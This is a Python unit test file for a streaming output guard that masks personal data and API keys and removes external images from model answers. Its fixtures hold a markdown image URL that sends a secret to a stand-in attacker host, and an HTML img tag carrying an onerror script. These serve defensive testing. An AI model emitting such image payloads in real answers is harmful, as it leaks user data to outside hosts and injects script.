"""
模型「回答」檢查（services/output_guard）的單元測試

重點是串流：回答是一小段一小段送出來的，個資或圖片語法可能被切在兩段之間。
要求「不管怎麼切段，結果都和整段一次檢查一模一樣」——用固定種子的隨機切段、隨機拼字來驗證。
不需要模型、不需要資料庫。
"""

import random

import pytest

from app.services.output_guard import OutputScreen, screen_output

KEY = "sk-" + "aB3dE6gH9jK2mN5pQ8sT1vW4yZ7cF0hL3nR6uX9bD2fG5jM8q"  # 51 字的金鑰樣式

TEXTS = {
    "英文長句裡的電子郵件": "Please forward the signed contract and the two attachments to our account manager at john.doe.longname@example-company.com before the end of this week so we can proceed.",
    "英文裡的手機和卡號": "You can reach me on 0912 345 678 any time and the card on file is 4111 1111 1111 1111 for the deposit payment.",
    "統編（關鍵字在前）": "本公司統編 12345678，發票請開三聯式。另外統一編號：87654321 是子公司的。",
    "統編（號碼在前）": "發票上的 12345678 是我們的統編，請不要寫錯。",
    "護照": "他的護照號碼：123456789，效期到明年。Passport no. 987654321 belongs to the other traveller.",
    "VAT": "Our VAT 12345678 should be printed on the invoice.",
    "長金鑰": f"設定檔裡的金鑰是 {KEY}，請不要外流。The key {KEY} must be rotated.",
    "混合": "聯絡人王小明（ming.wang@example.com、0912-345-678），身分證 A123456789；流程圖 ![圖](https://evil.example/x?d=1) 請參考，統編 24567890。",
    "圖片（Markdown、HTML）": "流程如下：\n![流程圖](https://evil.example/leak?data=secret123)\n請參考。另一張 <img src=\"http://evil.example/x.png\" onerror=\"alert(1)\"> 結束。",
    "沒有個資的數字": "今年營收 12345678 元，比去年成長 12%。訂單編號 2026111300 已出貨，共 3 箱。",
    "一般英文": "The quarterly report shows revenue growth of 12 percent across all regions this year, and the team expects the same next quarter.",
    "一般中文": "出差住宿費每晚上限新臺幣三千二百元，超過部分自行負擔。請於三日前提出申請！統計如下：",
}

# 隨機拼字用的零件：各種個資、關鍵字、數字、標點、一般字詞、圖片語法（含沒寫完的）
PARTS = [
    "A123456789", "0912-345-678", "0912 345 678", "0987654321", "4111 1111 1111 1111", "4111-1111-1111-1111",
    "ming.wang@example.com", "a@b.tw", "sk-aB3dE6gH9jK2mN5pQ8sT1vW4yZ7cF0hL3nR6uX9", "ghp_abcdefghijklmnopqrstuvwx0123",
    "統編", "統一編號", "護照", "護照號碼", "passport", "VAT", "12345678", "123456789", "87654321", "2026", "12", "3",
    "，", "。", "：", "、", " ", " ", " ", "\n", "！", "!", "<", "(", ")", "[", "]", "-", ".",
    "請", "發票", "我們的", "是", "公司", "號碼", "統", "護", "編號", "一",
    "the", "report", "is", "at", "no.", "ID", "call", "me",
    "![圖](https://evil.example/a.png)", "![x](/local.png)", "<img src=\"http://e.example/x\">", "![未完成](http://",
]


def stream(text: str, sizes) -> tuple[str, dict, int]:
    """照 sizes 一段一段餵；回傳（結果、報告、過程中最多暫留幾個字）"""
    screen = OutputScreen()
    out, i, lag = "", 0, 0
    for n in sizes:
        if i >= len(text):
            break
        out += screen.feed(text[i:i + n])
        i += n
        lag = max(lag, len(screen._pending) + len(screen._raw))
    out += screen.feed(text[i:]) + screen.flush()
    return out, screen.report, lag


class TestWholeText:
    """整段一次檢查"""

    def test_masks_every_kind(self):
        out, report = screen_output("聯絡人王小明，身分證 A123456789，手機 0912-345-678，信箱 ming.wang@example.com，卡號 4111 1111 1111 1111。")
        for secret in ("A123456789", "0912-345-678", "ming.wang@example.com", "4111 1111 1111 1111"):
            assert secret not in out
        assert report["pii"] == 4

    def test_external_images_removed(self):
        out, report = screen_output(TEXTS["圖片（Markdown、HTML）"])
        assert "evil.example" not in out and "secret123" not in out and "<img" not in out
        assert "已移除外部圖片：流程圖" in out
        assert report["images"] == 2

    def test_local_images_kept(self):
        text = "![圖](/static/a.png) ![b](data:image/png;base64,AAAA)"
        assert screen_output(text)[0] == text

    def test_control_characters(self):
        assert screen_output("a\x00b\x07\nc\td")[0] == "ab\nc\td"

    def test_context_numbers(self):
        """統編、護照要有關鍵字在旁邊才算；單純的 8 位數字不動"""
        assert "12345678" not in screen_output(TEXTS["統編（關鍵字在前）"])[0]
        assert "12345678" not in screen_output(TEXTS["統編（號碼在前）"])[0]
        assert "123456789" not in screen_output(TEXTS["護照"])[0]
        assert screen_output(TEXTS["沒有個資的數字"])[0] == TEXTS["沒有個資的數字"]

    def test_long_key(self):
        assert KEY not in screen_output(TEXTS["長金鑰"])[0]


class TestStreaming:
    """串流：怎麼切段結果都要一樣"""

    @pytest.mark.parametrize("name", list(TEXTS))
    def test_same_as_whole_for_any_chunking(self, name):
        text = TEXTS[name]
        whole, report = screen_output(text)
        rng = random.Random(20261113)
        plans = [[n] * len(text) for n in (1, 2, 3, 5, 8)]
        plans += [[rng.randint(1, 12) for _ in range(len(text))] for _ in range(200)]
        for sizes in plans:
            out, got, _ = stream(text, sizes)
            assert out == whole, f"切法 {sizes[:12]}…"
            assert got == report

    @pytest.mark.parametrize("pool_name", ["pii", "image", "mixed"])
    def test_random_text_same_as_whole(self, pool_name):
        """隨機拼出來的文字（包含刻意刁難的組合）也一樣"""
        images = [x for x in PARTS if x.startswith(("![", "<img"))]
        context = ["統編", "統一編號", "護照", "護照號碼", "passport", "VAT", "12345678", "123456789", "87654321", "統", "護", "編號", "號碼"]
        plain = [x for x in PARTS if x not in images]
        pool = {"pii": plain, "image": [x for x in plain if x not in context] + images * 3, "mixed": PARTS}[pool_name]
        rng = random.Random(1113)
        for _ in range(3000):
            text = "".join(rng.choice(pool) for _ in range(rng.randint(2, 14)))
            whole, report = screen_output(text)
            mode = rng.random()
            sizes = [1 if mode < 0.3 else rng.randint(1, 3) if mode < 0.6 else rng.randint(1, 15) for _ in range(len(text))]
            out, got, _ = stream(text, sizes)
            assert out == whole, repr(text)
            assert got == report, repr(text)

    @pytest.mark.parametrize("name,limit", [("一般中文", 4), ("一般英文", 16)])
    def test_plain_text_is_not_held_back(self, name, limit):
        """一般文字不能被拖住：一個字一個字進來時，暫留的字數要很少（不然畫面會一頓一頓）"""
        text = TEXTS[name]
        out, _, lag = stream(text, [1] * len(text))
        assert out == text
        assert lag <= limit

    def test_punctuation_does_not_stick(self):
        text = "太好了！結果 3 < 5，對吧!"
        assert stream(text, [1] * len(text))[0] == text

    def test_unfinished_image_is_flushed_as_text(self):
        """寫到一半就結束的圖片語法：照原樣送出（不會吞字）"""
        text = "請看 ![流程圖](https://example"
        assert stream(text, [1] * len(text))[0] == text
